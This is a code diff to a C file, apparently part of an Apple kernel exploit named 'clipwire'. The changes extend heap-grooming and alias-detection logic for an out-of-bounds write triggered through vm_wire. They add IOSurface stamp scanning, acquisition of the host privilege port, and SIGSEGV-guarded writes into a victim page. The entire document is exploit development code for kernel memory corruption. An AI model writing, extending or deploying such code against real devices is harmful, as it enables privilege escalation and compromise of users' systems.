@@ -1,4 +1,5 @@
 #include "clipwire.h"
+#include <mach/host_priv.h>
 #include <IOSurface/IOSurface.h>
 #include <signal.h>
 #include <setjmp.h>
@@ -45,8 +46,12 @@ static groom_obj_t g_groom_surf[GROOM_OBJECTS];
 static U64 g_groom_surf_n = 0;
 
 static int g_victim_idx = -1;
+static int g_victim_surf_idx = -1;
 static U64 g_victim_start = 0;
 static U64 g_victim_end = 0;
+
+/* magic stamped into surf bases for write-through detection */
+#define SURF_STAMP(i) (0x80A7F01D00000000ULL ^ (U64)(i))
 
 static jmp_buf g_segv_jmp;
 static volatile sig_atomic_t g_in_peek = 0;
@@ -181,6 +186,7 @@ void wire_teardown_objects(void)
     }
     g_groom_surf_n = 0;
     g_victim_idx = -1;
+    g_victim_surf_idx = -1;
 }
 
 /* ---- wire drivers ---- */
@@ -194,9 +200,11 @@ static U64 wire_via_mlock(U64 start, U64 end)
 
 static U64 wire_via_mach_vm_wire(U64 start, U64 end)
 {
-    host_priv_t host = mach_host_self();
-    kern_return_t kr = vm_wire(host, mach_task_self(), start, end - start,
-                               VM_PROT_READ | VM_PROT_WRITE);
+    host_priv_t host = HOST_PRIV_NULL;
+    kern_return_t kr = host_get_host_priv_port(mach_host_self(), &host);
+    if (kr != KERN_SUCCESS || host == HOST_PRIV_NULL) return 0;
+    kr = vm_wire(host, mach_task_self(), start, end - start,
+                 VM_PROT_READ | VM_PROT_WRITE);
     mach_port_deallocate(mach_task_self(), host);
     if (kr != KERN_SUCCESS) return 0;
     return (end - start) >> PAGE_SHIFT;
@@ -232,12 +240,16 @@ bool run_wire_oob(U64 start, U64 end, wire_result_t *r)
     return true;
 }
 
-/* Scan the victim's first `probe_pages` for a groom stamp. If groom G's
+/* Scan the victim's first `probe_pages` for a groom/surf stamp. If groom G's
  * page array was overwritten by the wire-OOB, G maps the victim's pages:
  * writing G's magic through G's user VA lands in the victim's pages, so a
- * stamp showing up there proves the alias and identifies G. */
+ * stamp showing up there proves the alias and identifies G. Returns the COW
+ * groom index on a COW hit, -2 on a surf (phys-window) hit, -1 on no hit. */
 static int find_write_through(U64 victim, U64 probe_pages)
 {
+    g_victim_idx = -1;
+    g_victim_surf_idx = -1;
+
     for (U64 i = 0; i < g_groom_cow_n; i++) {
         U64 want = g_groom_cow[i].magic;
         for (U64 pg = 0; pg < probe_pages; pg++) {
@@ -250,6 +262,23 @@ static int find_write_through(U64 victim, U64 probe_pages)
                 LOGOK("groom[%llu] aliases victim: write-through confirmed on page %llu", i, pg);
                 g_victim_idx = (int)i;
                 return (int)i;
+            }
+        }
+    }
+
+    for (U64 i = 0; i < g_groom_surf_n; i++) {
+        U64 want = SURF_STAMP(i);
+        for (U64 pg = 0; pg < probe_pages; pg++) {
+            int ok = 1;
+            for (int b = 0; b < 8; b++) {
+                int byte = peek_u8(victim + pg * PAGE_SIZE_ + b);
+                if (byte != (int)((want >> (b * 8)) & 0xff)) { ok = 0; break; }
+            }
+            if (ok) {
+                LOGOK("surf[%llu] aliases victim: write-through confirmed on page %llu "
+                      "(phys-window object in OOB path)", i, pg);
+                g_victim_surf_idx = (int)i;
+                return -2;
             }
         }
     }
@@ -270,6 +299,11 @@ int verify_wire_landed(wire_result_t *r)
         if (dst == NULL) continue;
         dst[0] = g_groom_cow[i].magic;
     }
+    for (U64 i = 0; i < g_groom_surf_n; i++) {
+        volatile U64 *dst = (volatile U64 *)g_groom_surf[i].base;
+        if (dst == NULL) continue;
+        dst[0] = SURF_STAMP(i);
+    }
 
     wire_range(r->corrupt_start, r->corrupt_end);
 
@@ -279,6 +313,11 @@ int verify_wire_landed(wire_result_t *r)
 int wire_victim_index(void)
 {
     return g_victim_idx;
+}
+
+int wire_victim_surf(void)
+{
+    return g_victim_surf_idx;
 }
 
 bool wire_victim_range(U64 *start, U64 *end)
@@ -327,7 +366,11 @@ bool wire_oob_write(U64 array_index, U64 *written_u64)
     /* clear the victim's first page, then stamp every groom */
     for (U64 p = 0; p < PAGE_SIZE_; p += 8) {
         peek_u8(g_victim_start + p);          /* touch (may fault on teardown) */
-        *(volatile U64 *)(g_victim_start + p) = 0;
+        g_in_peek = 1;
+        if (sigsetjmp(g_segv_jmp, 1) == 0) {
+            *(volatile U64 *)(g_victim_start + p) = 0;
+        }
+        g_in_peek = 0;
     }
     for (U64 i = 0; i < g_groom_cow_n; i++) {
         volatile U64 *dst = (volatile U64 *)g_groom_cow[i].cow.dst_addr;
